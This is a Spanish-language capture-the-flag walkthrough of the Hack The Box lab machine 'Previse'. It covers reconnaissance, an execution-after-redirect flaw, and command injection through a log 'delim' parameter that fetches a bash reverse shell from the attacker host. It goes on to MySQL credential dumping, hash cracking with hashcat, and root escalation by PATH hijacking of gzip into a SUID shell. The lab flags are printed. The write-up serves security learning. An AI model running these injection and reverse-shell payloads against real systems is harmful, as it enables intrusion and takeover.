---
icon: desktop
layout:
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
---

# Previse

`Previse` es una máquina sencilla que muestra Ejecución después de redirección (EAR) que permite a los usuarios recuperar el contenido y realizar solicitudes a `accounts.php` sin estar autenticado, lo que lleva a abusar de la función `exec()` de PHP ya que las entradas del usuario no se desinfectan, lo que permite la ejecución remota de código contra el objetivo, después de obtener un privilegio de shell www-data, la escalada comienza con la recuperación y el descifrado de un hash MD5Crypt personalizado que consiste en una sal Unicode y una vez descifrado permite a los usuarios obtener acceso SSH al objetivo y luego abusar de un script ejecutable sudo que no incluye rutas absolutas de las funciones que utiliza, lo que permite a los usuarios realizar el secuestro de PATH en el objetivo para comprometer la máquina.

<figure><img src="../../.gitbook/assets/Previse.png" alt="" width="563"><figcaption></figcaption></figure>

***





```bash
❯ nmap -p- --open -sS --min-rate 1000 -vvv -Pn -n 10.10.11.104 -oG allPorts
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.95 ( https://nmap.org ) at 2025-03-03 02:55 CET
Initiating SYN Stealth Scan at 02:55
Scanning 10.10.11.104 [65535 ports]
Discovered open port 80/tcp on 10.10.11.104
Discovered open port 22/tcp on 10.10.11.104
Completed SYN Stealth Scan at 02:55, 13.30s elapsed (65535 total ports)
Nmap scan report for 10.10.11.104
Host is up, received user-set (0.036s latency).
Scanned at 2025-03-03 02:55:17 CET for 13s
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 63
80/tcp open  http    syn-ack ttl 63

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 13.44 seconds
           Raw packets sent: 65607 (2.887MB) | Rcvd: 65541 (2.622MB)
```



```bash
❯ extractPorts allPorts

[*] Extracting information...

	[*] IP Address: 10.10.11.104
	[*] Open ports: 22,80

[*] Ports copied to clipboard
```



```bash
❯ nmap -sCV -p22,80 10.10.11.104 -A -oN targeted -oX targetedXML
Starting Nmap 7.95 ( https://nmap.org ) at 2025-03-03 02:56 CET
Nmap scan report for 10.10.11.104
Host is up (0.033s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 53:ed:44:40:11:6e:8b:da:69:85:79:c0:81:f2:3a:12 (RSA)
|   256 bc:54:20:ac:17:23:bb:50:20:f4:e1:6e:62:0f:01:b5 (ECDSA)
|_  256 33:c1:89:ea:59:73:b1:78:84:38:a4:21:10:0c:91:d8 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
| http-title: Previse Login
|_Requested resource was login.php
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Linux 4.X|5.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS details: Linux 4.15 - 5.19, Linux 5.0, Linux 5.0 - 5.14
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 22/tcp)
HOP RTT      ADDRESS
1   32.39 ms 10.10.14.1
2   32.52 ms 10.10.11.104

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.82 seconds
```



```bash
❯ xsltproc targetedXML > index.html

❯ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```



<figure><img src="../../.gitbook/assets/5282_vmware_jgmq6S4Ttx.png" alt=""><figcaption></figcaption></figure>



```bash
❯ whatweb -a 3 http://10.10.11.104
http://10.10.11.104 [302 Found] Apache[2.4.29], Cookies[PHPSESSID], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.29 (Ubuntu)], IP[10.10.11.104], Meta-Author[m4lwhere], RedirectLocation[login.php], Script, Title[Previse Home]
http://10.10.11.104/login.php [200 OK] Apache[2.4.29], Cookies[PHPSESSID], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.29 (Ubuntu)], IP[10.10.11.104], Meta-Author[m4lwhere], PasswordField[password], Script, Title[Previse Login]
```



<figure><img src="../../.gitbook/assets/imagen.png" alt=""><figcaption></figcaption></figure>



<figure><img src="../../.gitbook/assets/imagen (4).png" alt=""><figcaption></figcaption></figure>



```bash
❯ feroxbuster -u http://10.10.11.104/ -t 200 -C 500,502,404 -x php
                                                                                                                                                                                                                                      
 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.11.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://10.10.11.104/
 🚀  Threads               │ 200
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 💢  Status Code Filters   │ [500, 502, 404]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.11.0
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 💲  Extensions            │ [php]
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
403      GET        9l       28w      277c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
404      GET        9l       31w      274c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
200      GET        1l        1w      263c http://10.10.11.104/site.webmanifest
200      GET        6l       17w     1258c http://10.10.11.104/favicon-16x16.png
200      GET       10l       39w    29694c http://10.10.11.104/favicon.ico
302      GET       74l      176w     2966c http://10.10.11.104/status.php => login.php
200      GET        3l     4821w    65009c http://10.10.11.104/js/uikit-icons.min.js
200      GET        3l     2219w   133841c http://10.10.11.104/js/uikit.min.js
200      GET        1l     4285w   274772c http://10.10.11.104/css/uikit.min.css
301      GET        9l       28w      309c http://10.10.11.104/js => http://10.10.11.104/js/
302      GET       71l      164w     2801c http://10.10.11.104/index.php => login.php
301      GET        9l       28w      310c http://10.10.11.104/css => http://10.10.11.104/css/
302      GET        0l        0w        0c http://10.10.11.104/download.php => login.php
302      GET       93l      238w     3994c http://10.10.11.104/accounts.php => login.php
200      GET       31l       60w     1248c http://10.10.11.104/nav.php
200      GET       20l       64w      980c http://10.10.11.104/header.php
200      GET        5l       14w      217c http://10.10.11.104/footer.php
200      GET        0l        0w        0c http://10.10.11.104/config.php
302      GET        0l        0w        0c http://10.10.11.104/logout.php => login.php
200      GET       53l      138w     2224c http://10.10.11.104/login.php
302      GET       71l      164w     2801c http://10.10.11.104/ => login.php
```



<figure><img src="../../.gitbook/assets/imagen (1).png" alt=""><figcaption></figcaption></figure>



<figure><img src="../../.gitbook/assets/imagen (2).png" alt=""><figcaption></figcaption></figure>



{% code title="accounts.php" %}
```html
<section class="uk-section uk-section-default">
    <div class="uk-container">
        <h2 class="uk-heading-divider">Add New Account</h2>
        <p>Create new user.</p>
        <p class="uk-alert-danger">ONLY ADMINS SHOULD BE ABLE TO ACCESS THIS PAGE!!</p>
        <p>Usernames and passwords must be between 5 and 32 characters!</p>
    </p>
        <form role="form" method="post" action="accounts.php">
            <div class="uk-margin">
                <div class="uk-inline">
                    <span class="uk-form-icon" uk-icon="icon: user"></span>
                    <input type="text" name="username" class="uk-input" id="username" placeholder="Username">
                </div>
            </div>
            <div class="uk-margin">
                <div class="uk-inline">
                    <span class="uk-form-icon" uk-icon="icon: lock"></span>
                    <input type="password" name="password" class="uk-input" id="password" placeholder="Password">
                </div>
            </div>
            <div class="uk-margin">
                <div class="uk-inline">
                    <span class="uk-form-icon" uk-icon="icon: lock"></span>
                    <input type="password" name="confirm" class="uk-input" id="confirm" placeholder="Confirm Password">
                </div>
            </div>
            <button type="submit" name="submit" class="uk-button uk-button-default">CREATE USER</button>
        </form>
    </div>
</section>
```
{% endcode %}



{% embed url="https://owasp.org/www-community/attacks/Execution_After_Redirect_(EAR)" %}





```php
<?php if (!$loggedin) {
     print "<script>window.location = '/login';</script>\n\n"; 
} ?>
```





<figure><img src="../../.gitbook/assets/imagen (5).png" alt=""><figcaption></figcaption></figure>



<figure><img src="../../.gitbook/assets/imagen (6).png" alt=""><figcaption></figcaption></figure>



<figure><img src="../../.gitbook/assets/imagen (7).png" alt=""><figcaption></figcaption></figure>



<figure><img src="../../.gitbook/assets/imagen (8).png" alt=""><figcaption></figcaption></figure>



status.php

<figure><img src="../../.gitbook/assets/imagen (9).png" alt=""><figcaption></figcaption></figure>



<figure><img src="../../.gitbook/assets/imagen (10).png" alt=""><figcaption></figcaption></figure>





<figure><img src="../../.gitbook/assets/imagen (11).png" alt=""><figcaption></figcaption></figure>



<figure><img src="../../.gitbook/assets/imagen (12).png" alt=""><figcaption></figcaption></figure>





<figure><img src="../../.gitbook/assets/imagen (13).png" alt=""><figcaption></figcaption></figure>



```bash
❯ ls -l siteBackup.zip
.rw-rw-r-- kali kali 9.7 KB Mon Mar  3 03:25:44 2025  siteBackup.zip
❯ unzip siteBackup.zip
Archive:  siteBackup.zip
  inflating: accounts.php            
  inflating: config.php              
  inflating: download.php            
  inflating: file_logs.php           
  inflating: files.php               
  inflating: footer.php              
  inflating: header.php              
  inflating: index.php               
  inflating: login.php               
  inflating: logout.php              
  inflating: logs.php                
  inflating: nav.php                 
  inflating: status.php    
```



{% code title="file_logs.php" %}
```php
<?php
session_start();
if (!isset($_SESSION['user'])) {
    header('Location: login.php');
}
?>

<?php include( 'header.php' ); ?>

<title>Previse File Access Logs</title>
</head>
<body>

<?php include( 'nav.php' ); ?>
<section class="uk-section uk-section-default">
    <div class="uk-container">
        <h2 class="uk-heading-divider">Request Log Data</h2>
        <p>We take security very seriously, and keep logs of file access actions. We can set delimters for your needs!</p>
        <p>Find out which users have been downloading files.</p>
        <form action="logs.php" method="post">
            <div class="uk-margin uk-width-1-4@s">
                <label class="uk-form-label" for="delim-log">File delimeter:</label>
                <select class="uk-select" name="delim" id="delim-log">
                    <option value="comma">comma</option>
                    <option value="space">space</option>
                    <option value="tab">tab</option>
                </select>
            </div>
            <button class="uk-button uk-button-default" type="submit" value="submit">Submit</button>
        </form>
    </div>
</section>
    
<?php include( 'footer.php' ); ?>
```
{% endcode %}





Previse File Access Logs

### Request Log Data

We take security very seriously, and keep logs of file access actions. We can set delimters for your needs!

Find out which users have been downloading files.

File delimeter: commaspacetabSubmit



```bash
❯ catnp out.log
time,user,fileID
1622482496,m4lwhere,4
1622485614,m4lwhere,4
1622486215,m4lwhere,4
1622486218,m4lwhere,1
1622486221,m4lwhere,1
1622678056,m4lwhere,5
1622678059,m4lwhere,6
1622679247,m4lwhere,1
1622680894,m4lwhere,5
1622708567,m4lwhere,4
1622708573,m4lwhere,4
1622708579,m4lwhere,5
1622710159,m4lwhere,4
1622712633,m4lwhere,4
1622715674,m4lwhere,24
1622715842,m4lwhere,23
1623197471,m4lwhere,25
1623200269,m4lwhere,25
1623236411,m4lwhere,23
1623236571,m4lwhere,26
1623238675,m4lwhere,23
1623238684,m4lwhere,23
1623978778,m4lwhere,32
1740968808,gzzcoo,32
```



```bash
❯ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```



```bash
delim=comma;+curl+10.10.14.2/gzzcoo+#
```

<figure><img src="../../.gitbook/assets/5299_vmware_74x3qbN3kA.png" alt=""><figcaption></figcaption></figure>



```bash
❯ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.11.104 - - [03/Mar/2025 03:32:21] code 404, message File not found
10.10.11.104 - - [03/Mar/2025 03:32:21] "GET /gzzcoo HTTP/1.1" 404 -
```



```bash
❯ echo '#!/bin/bash \n/bin/bash -c "bash -i >& /dev/tcp/10.10.14.2/443 0>&1"' > shell.sh

❯ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```



```bash
❯ nc -nlvp 443
listening on [any] 443 ...
```



```bash
delim=comma;+curl+10.10.14.2/shell.sh|bash+#
```

<figure><img src="../../.gitbook/assets/5300_vmware_f5CLBV3cZM.png" alt=""><figcaption></figcaption></figure>



```bash
❯ nc -nlvp 443
listening on [any] 443 ...
connect to [10.10.14.2] from (UNKNOWN) [10.10.11.104] 51490
bash: cannot set terminal process group (1576): Inappropriate ioctl for device
bash: no job control in this shell
www-data@previse:/var/www/html$ 
```



```bash
www-data@previse:/var/www/html$ script /dev/null -c bash
script /dev/null -c bash
Script started, file is /dev/null
www-data@previse:/var/www/html$ ^Z
zsh: suspended  nc -nlvp 443
❯ stty raw -echo;fg
[1]  + continued  nc -nlvp 443
                              reset xterm
```



```bash
www-data@previse:/var/www/html$ export TERM=xterm
www-data@previse:/var/www/html$ export SHELL=bash
www-data@previse:/var/www/html$ stty rows 46 columns 230
```



```bash
www-data@previse:/var/www/html$ cat config.php 
<?php

function connectDB(){
    $host = 'localhost';
    $user = 'root';
    $passwd = 'mySQL_p@ssw0rd!:)';
    $db = 'previse';
    $mycon = new mysqli($host, $user, $passwd, $db);
    return $mycon;
}

?>
```



```bash
www-data@previse:/var/www/html$ mysql -h localhost -u root -p'mySQL_p@ssw0rd!:)' -D previse
mysql: [Warning] Using a password on the command line interface can be insecure.
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 23
Server version: 5.7.35-0ubuntu0.18.04.1 (Ubuntu)

Copyright (c) 2000, 2021, Oracle and/or its affiliates.

Oracle is a registered trademark of Oracle Corporation and/or its
affiliates. Other names may be trademarks of their respective
owners.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

mysql> SHOW TABLES;
+-------------------+
| Tables_in_previse |
+-------------------+
| accounts          |
| files             |
+-------------------+
2 rows in set (0.00 sec)

mysql> SELECT * FROM accounts;
+----+----------+------------------------------------+---------------------+
| id | username | password                           | created_at          |
+----+----------+------------------------------------+---------------------+
|  1 | m4lwhere | $1$🧂llol$DQpmdvnb7EeuO6UaqRItf. | 2021-05-27 18:18:36 |
|  2 | gzzcoo   | $1$🧂llol$OF5igbTSVf3DfojtQUj.p. | 2025-03-03 02:23:40 |
|  3 | Gzzcoo1  | $1$🧂llol$lLCHpmFzMin57aRu3E6Zu/ | 2025-03-03 02:25:27 |
+----+----------+------------------------------------+---------------------+
3 rows in set (0.00 sec)
```



```bash
❯ hashcat -a 0 hashes /usr/share/wordlists/rockyou.txt
hashcat (v6.2.6) starting in autodetect mode

OpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, LLVM 18.1.8, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
============================================================================================================================================
* Device #1: cpu-sandybridge-11th Gen Intel(R) Core(TM) i5-1135G7 @ 2.40GHz, 2913/5890 MB (1024 MB allocatable), 8MCU

Hash-mode was not specified with -m. Attempting to auto-detect hash mode.
The following mode was auto-detected as the only one matching your input hash:

500 | md5crypt, MD5 (Unix), Cisco-IOS $1$ (MD5) | Operating System


$1$🧂llol$DQpmdvnb7EeuO6UaqRItf.:ilovecody112235!  
```



```bash
❯ sshpass -p 'ilovecody112235!' ssh m4lwhere@10.10.11.104
Welcome to Ubuntu 18.04.5 LTS (GNU/Linux 4.15.0-151-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Mon Mar  3 02:49:19 UTC 2025

  System load:  0.0               Processes:           181
  Usage of /:   50.2% of 4.85GB   Users logged in:     0
  Memory usage: 23%               IP address for eth0: 10.10.11.104
  Swap usage:   0%


0 updates can be applied immediately.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.


Last login: Fri Jun 18 01:09:10 2021 from 10.10.10.5
m4lwhere@previse:~$ cat user.txt 
b3888321b679faa26e5bb8b757c33362
```





```bash
m4lwhere@previse:~$ sudo -l
[sudo] password for m4lwhere: 
User m4lwhere may run the following commands on previse:
    (root) /opt/scripts/access_backup.sh
```



```bash
#!/bin/bash

# We always make sure to store logs, we take security SERIOUSLY here

# I know I shouldnt run this as root but I cant figure it out programmatically on my account
# This is configured to run with cron, added to sudo so I can run as needed - we'll fix it later when there's time

gzip -c /var/log/apache2/access.log > /var/backups/$(date --date="yesterday" +%Y%b%d)_access.gz
gzip -c /var/www/file_access.log > /var/backups/$(date --date="yesterday" +%Y%b%d)_file_access.gz
```



```bash
m4lwhere@previse:/tmp$ which gzip
/bin/gzip

m4lwhere@previse:/tmp$ echo $PATH
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
```



```bash
m4lwhere@previse:/tmp$ cat gzip 
#!/bin/bash

cp /bin/bash /tmp/gzzcoo && chmod u+s /tmp/gzzcoo
m4lwhere@previse:/tmp$ chmod 777 gzip 
```



```bash
m4lwhere@previse:/tmp$ sudo PATH=/tmp:$PATH /opt/scripts/access_backup.sh
m4lwhere@previse:/tmp$ ls -l 
total 1108
-rwxrwxrwx 1 m4lwhere m4lwhere      63 Mar  3 03:03 gzip
-rwsr-xr-x 1 root     root     1113504 Mar  3 03:04 gzzcoo
drwx------ 3 root     root        4096 Mar  3 01:55 systemd-private-291eb14f1df84d53886e71baa3ee24a8-apache2.service-HTUQ4f
drwx------ 3 root     root        4096 Mar  3 01:55 systemd-private-291eb14f1df84d53886e71baa3ee24a8-systemd-resolved.service-hFyPyE
drwx------ 3 root     root        4096 Mar  3 01:55 systemd-private-291eb14f1df84d53886e71baa3ee24a8-systemd-timesyncd.service-hi0tJv
drwx------ 2 root     root        4096 Mar  3 01:56 vmware-root_879-4013723248
m4lwhere@previse:/tmp$ /tmp/gzzcoo -p
gzzcoo-4.4# whoami
root
gzzcoo-4.4# cat /root/root.txt 
745bb4f0a84573e95fa68612fc4ac0e7
```
